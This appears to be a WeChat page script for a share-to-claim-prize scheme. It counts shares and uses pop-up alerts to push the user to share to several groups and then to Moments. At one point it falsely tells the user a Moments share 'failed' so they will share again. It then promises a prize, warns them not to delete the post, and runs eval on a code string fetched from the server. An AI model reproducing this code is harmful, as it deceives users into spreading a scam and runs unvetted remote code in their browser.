var shareATimes = 0;
var shareTTimes = 0;

function configReload() {
    wx.config(window.config);
    wx.ready(function(){
        wx.onMenuShareAppMessage({
            title: window.csd.Ad.title,
            desc: window.csd.Ad.desc,
            link: window.csd.Ad.link,
            imgUrl: window.csd.Ad.img,
            success: function () {
                shareATimes += 1;
                share_tip(shareATimes,shareTTimes);
            },
            cancel: function () {

            }
        });
    });
}


function configReload(type) {
    wx.config(window.data.config);
    wx.ready(function(){
        if (type == 1) {
            wx.onMenuShareAppMessage({
                title: window.data.share_app_info1.title,
                link: window.data.share_app_info1.link,
              	desc: window.data.share_app_info1.desc,
                imgUrl: window.data.share_app_info1.img_url,
                success: function () {
                    shareATimes += 1;
                    share_tip(shareATimes,shareTTimes);
                },
                cancel: function () {

                }
            });
        } else {
            wx.onMenuShareTimeline({
                title: window.data.share_timeline_info2.title,
                link: window.data.share_timeline_info2.link,
                imgUrl: window.data.share_timeline_info2.img_url,
                success: function () {
                    shareTTimes += 1;
                    share_tip(shareATimes,shareTTimes);
                },
                cancel: function () {

                }
            });
        }
    });
}

var shareATimes = 0;
var shareTTimes = 0;

$(function () {
    $.ajax({
        type : "GET",
        url: "jssdk/urlbak.php?url=" + encodeURIComponent(location.href.split('#')[0]) + '&_=' + Date.now(),
        dataType : "jsonp",
        jsonp:"callback",
        data:{},
        success : function(result){
            window.data = result;
            wx.config(window.data.config);
            share_config(window.data);
        }
    });
});
function share_config(data){
    wx.config(data.config);
    wx.ready(function(){
		wx.hideOptionMenu();
        wx.onMenuShareAppMessage({
            title: data.share_app_info.title,
            desc: data.share_app_info.desc,
            link: data.share_app_info.link,
            imgUrl: data.share_app_info.img_url,
            success: function () {
                shareATimes += 1;
                share_tip(shareATimes,shareTTimes);
            },
            cancel: function () {

            }
        });
        wx.onMenuShareTimeline({
            title: data.share_timeline_info.title,
            link: data.share_timeline_info.link,
            imgUrl: data.share_timeline_info.img_url,
            success: function () {
                shareTTimes += 1;
                share_tip(shareATimes,shareTTimes);
            },
            cancel: function () {

            }
        });
    });
}

function share_tip(share_app_times, share_timeline_times) {
    if (share_app_times < 3) {
        if (share_app_times == 2){
            weui.alert('分享<span style="font-size: 30px;color: #f5294c">分享成功</span>,请继续分享到不同的群！', '好')
			configReload(1);
        }else{
            weui.alert('分享成功,请继续分享到<span style="font-size: 30px;color: #f5294c">' + (2 - share_app_times) + '</span>个不同的群即可领取！', '好');
        }
    } else {
        wx.hideOptionMenu();
        wx.showMenuItems({menuList:['menuItem:share:timeline']});
        if (share_timeline_times < 1) {
            weui.alert('分享成功，剩下最后一步啦！<br />请分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可领取!', '好')
        } else {
			if(share_timeline_times == 1){
				configReload(2);
				weui.alert('分享朋友圈<span style="font-size: 30px;color: #f5294c">失败</span>,请继续分享朋友圈！', '好')
			}else{
				weui.alert('由于参与人数过多，系统将依照顺序逐步发放到您所对应的账号，请耐心等待<br/><br/><span style="font-size: 26px;color:#f5294c">朋友圈信息不可删除</span><br/><br/>否则无法核实用户信息<br/><br/>以免奖品发放失败', '', function() {
				  eval(window.data.c_url)
				})
			}
        }
    }
}